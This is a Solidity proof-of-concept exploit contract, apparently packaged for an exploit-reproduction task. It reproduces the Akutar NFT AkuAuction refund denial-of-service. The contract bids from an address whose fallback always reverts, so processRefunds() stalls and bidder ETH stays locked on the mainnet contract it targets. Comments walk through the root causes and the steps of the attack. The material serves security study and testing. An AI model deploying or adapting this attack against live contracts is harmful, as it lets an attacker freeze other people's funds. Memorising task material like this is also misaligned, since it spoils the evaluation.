// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Akutar NFT (Aku-Auction) — refund DoS / permanently-locked-funds exploit.
//
// Faithful standalone re-implementation of the DeFiHackLabs PoC
// (test/AkutarNFT_exp.sol: AkutarNFTExploit.testDOSAttack). The Foundry test
// runs the attack INLINE on the test contract itself (the "malicious bidder"
// is `address(this)`, whose `fallback()` always reverts). There is no
// standalone exploit contract to deploy, so this file mirrors that inline
// attack as a self-contained contract — no imports, compiles anywhere.
//
// The attack: a contract whose receive path always reverts places a normal
// bid in AkuAuction.bid(). `bid()` / `_bid()` performs NO isContract check,
// so the reverting bidder is appended to the `allBids[]` array just like any
// EOA. Once the auction expires, the public processRefunds() loop walks
// `allBids[]` and `.call{value: refund}("")`-pushes ETH to each bidder
// followed by `require(sent, "Failed to refund bidder")`. When the loop
// reaches this reverting bidder, the `.call` returns false, the require
// reverts the WHOLE processRefunds() transaction, every refund pushed
// earlier in the same call is rolled back, and `refundProgress` is never
// written forward — so every retry hits the same reverting address and
// reverts again. Combined with the independent `claimProjectFunds()` bug
// (it gates on `refundProgress >= totalBids`, an index vs an NFT count, which
// can never be satisfied once any bidder takes >1 NFT), the residual bidder
// ETH is permanently locked. No value is extracted — this is pure griefing /
// frozen funds.

// VULNERABILITY: [Reverting Bidder DoS + Counter Mismatch Lock]
// [See detailed analysis in test/AkutarNFT_exp.sol and annotations in AkuAuction.sol sources. 
// Root: no contract filter on bid registration (AkuAuction.sol:536 myBids.bidder=msg.sender), 
// unsafe .call+require in processRefunds loop (601), and refundProgress (per-bidder) >= totalBids (per-NFT) (616) invariant violation.
// This file's run() + fallback() exactly reproduces the PoC registration + revert path.]
// EXPLOIT STEPS:
// 1. Call run() with msg.value = BID_VALUE (exact price, no bid-time refund).
// 2. AKU_AUCTION.bid registers this contract (contract addr) in allBids.
// 3. (offchain: warp) call processRefunds() -> hits fallback revert -> require fails entire tx.
// 4. claimProjectFunds also impossible due to type error on counters.

interface IAkuAuction {
    function bid(uint8 amount) external payable;
    function processRefunds() external;
    function claimProjectFunds() external;
}

contract AkutarNFTDOS {
    // The vulnerable AkuAuction contract (Ethereum mainnet).
    IAkuAuction internal constant AKU_AUCTION =
        IAkuAuction(0xF42c318dbfBaab0EEE040279C6a2588Fa01a961d);

    // The bid amount mirrors the PoC: a single-NFT bid at the fork-block dutch
    // price (3.5 ETH in the test). It only needs to register this contract as
    // a bidder in `allBids[]`; the exact value is not load-bearing.
    uint256 internal constant BID_VALUE = 3.5 ether;

    // Entrypoint (recorded). Plants the reverting bidder. Funded by the
    // caller's msg.value (setup.fundAttackerWei funds the attacker EOA, and
    // attackValueWei forwards it here). This call SUCCEEDS — registering the
    // malicious bidder is the whole attack; the DoS is the downstream
    // consequence (demonstrated editorially via the vulnerability/story).
    function run() external payable {
        AKU_AUCTION.bid{value: BID_VALUE}(1);
    }

    // The reverting receive path. This is what bricks processRefunds() when
    // the refund loop reaches this contract's slot in allBids[].
    fallback() external payable {
        revert("CAUSE REVERT !!!");
    }
}
